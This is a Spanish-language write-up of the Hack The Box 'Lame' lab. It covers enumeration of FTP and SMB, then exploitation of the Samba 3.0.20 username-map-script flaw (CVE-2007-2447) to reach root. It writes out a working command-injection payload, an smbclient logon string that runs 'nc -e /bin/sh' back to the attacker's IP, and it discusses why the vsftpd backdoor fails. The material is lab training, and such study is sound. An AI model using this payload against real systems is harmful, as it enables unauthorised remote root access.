![](../img/cc2f35f31baac4bb3bc5e0f7ad6a9df5.png)

🧩 **Dificultad**: Easy (Linux)  
🎯 **Dirección IP**: `10.10.10.3`  
🛠️ **Modo**: Guided Mode

## 🔍 **Fase 1: Enumeración**

### ⚡ Escaneo Nmap

```bash
nmap -sS --top-ports 1000 10.10.10.3
```

![](../img/dbf2a0bf1f7bead95039136c6fa1e9c3.png)

Comprobamos puertos **abiertos** y vemos lo siguiente:

```bash
- 21/tcp → FTP
    
- 22/tcp → SSH
    
- 139 y 445/tcp → SMB (samba)
```

Luego usamos escaneo con scripts:

```bash
nmap -sS -sC -sV --top-ports 1000 10.10.10.3
```

![](../img/fd1a116218a82e2d6c4669bbfaaeb1d7.png)

Servicios identificados:

- 🎯 **FTP**: vsftpd 2.3.4 con login anónimo habilitado.
    
- 🔐 **SSH**: OpenSSH 4.7p1
    
- 📁 **SMB**: Samba 3.0.20 (en puertos 139 y 445)

### 📎 Enumeración FTP

Probamos el acceso anónimo al FTP:

```bash
ftp 10.10.10.3
Name: anonymous
Password: (enter)
```

![](../img/0d7407bf0e9cafd7922661937af96e4d.png)

Resultado: no hay contenido útil en el FTP.


### 📁 Enumeración SMB

Enumeramos los recursos compartidos SMB:

```bash
smbclient -L //10.10.10.3 -N
```

![](../img/04cdb05aaaf68d4f56169088be86a597.png)

Recursos mostrados:

- `print$`, `tmp`, `opt`, `IPC$`, `ADMIN$`

Nos conectamos al recurso `tmp`:


![](../img/fd15d75bab37ffcc0cbc110a22280bed.png)

Al listar su contenido:

```bash
dir
```

vemos archivos del sistema como `.X11-unix`, `vmware-root`, etc, pero no le haremos caso.


## 💣 **Fase 2: Explotación – CVE-2007-2447 (Samba)**

Samba 3.0.20 es vulnerable a ejecución de comandos a través del campo `username` si se usa `username map script` en su configuración.

📌 Verificado con searchsploit:

```bash
searchsploit samba 3.0.20
```

![](../img/b8804b2f4cc0b45ccb59773f670a2775.png)


Consultamos el exploit directamente:

```bash
searchsploit -x unix/remote/16320.rb
```

![](../img/389afa6d93c9100fc1ca8b0718b509fb.png)

En el código vemos que el exploit inyecta el payload en la variable `username`, usando una línea como:

![](../img/b1dc0f80a9500b495f06488cb1181684.png)

```bash
username = "/=`nohup " + payload.encoded + "`"
```

Esto confirma que podemos pasar comandos directamente por el campo `username`.

### ✅ PoC: Reverse Shell directamente tras login

Tras comprobar que se puede inyectar comandos por el campo `username`, nos conectamos directamente al recurso `tmp`:

```bash
smbclient //10.10.10.3/tmp -N
```

Y luego ejecutamos el siguiente payload desde la consola interactiva de `smbclient` :

![](../img/314810ec21c24265d1b535c768699279.png)


```bash
logon "/=`nohup nc -e /bin/sh 10.10.16.84 4444`"
```

![](../img/354866c9b5d6419e66d602c9c6298152.png)

Se observa que el reverse shell **sí se conecta** correctamente:

![](../img/5689211c325ed2aeb244a93fdb9a8ac9%201.png)

![](../img/0dcc249faa5c400a0924f718b8b0d8c4.png)

Esto indica que, aunque el comando `logon` parece fallar por timeout, **la conexión inversa llega** y se puede trabajar con la shell abierta.

### ✅ Shell funcional y obtención de flags

Una vez obtenida la shell de root:

![](../img/e052024d4baa37ccd06b6173fd2ff14a.png)

## 📚 Conclusiones

- El acceso FTP anónimo no ofrece nada útil.
    
- El share `tmp` en SMB permite ejecutar comandos gracias a una vulnerabilidad en `username map script`.
    
- Basta con entrar anónimamente y usar `logon "payload"` desde dentro del cliente interactivo.
    
- Aunque el payload con `nc -e` muestre `NT_STATUS_IO_TIMEOUT`, **la conexión puede ser válida** si se observa con `nc -lvnp`.
    
- Acceso root sin autenticación → se capturan ambas flags directamente.


## 📁 Recursos y exploits

- ExploitDB → [16320.rb](https://www.exploit-db.com/exploits/16320)
    
- Blog técnico → [amriunix CVE-2007-2447](https://amriunix.com/post/cve-2007-2447-samba-usermap-script/)
    
- Shell cheat sheet → [Pentestmonkey Reverse Shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


-----------
## 🧱 Task adicional:

*Con una shell como root, podemos investigar por qué falló el exploit de VSFTPD. Nuestro escaneo inicial con `nmap` mostró cuatro puertos TCP abiertos. Pero si ejecutamos `netstat -tlnp` en la máquina víctima, veremos que hay **muchos más puertos escuchando**, incluso en `0.0.0.0` y en la IP externa de la máquina, por lo que **deberían ser accesibles desde fuera**.  

*¿Qué debe de estar bloqueando la conexión a estos puertos?*

![](../img/fb1b7cb824aac09c31fcc1398de50c0f.png)

## ¿Por qué falla el exploit de vsftpd?

Aunque vsftpd 2.3.4 es una versión con backdoor conocido, **el exploit no funciona en esta máquina**. La razón puede deberse a que hay otros puertos abiertos **localmente**, pero no accesibles desde el exterior.

### ✅ Respuesta correcta: `firewall`

Aunque hay puertos en escucha en la máquina víctima, **desde fuera** sólo vemos 4 porque el **firewall (como `iptables`) los está filtrando**. Es decir: están técnicamente abiertos, pero no accesibles remotamente.

Este firewall local puede estar limitando las conexiones entrantes desde el exterior, impidiendo la explotación de ciertos servicios como vsftpd.


## 🧪 Task 10: ¿Qué puerto se abre al activar el backdoor de VSFTPD?

Cuando se activa el backdoor de **vsftpd 2.3.4**, comienza a escuchar en el puerto:

![](../img/3397092759f4b9b36e85ae73304f598b.png)

Como nos da la info en el link de la web de la tarea anterior: 

https://0xdf.gitlab.io/2020/04/07/htb-lame.html#beyond-root---vsftpd

![](../img/659f498d76f31e9d9ba6dc3316d5502c.png)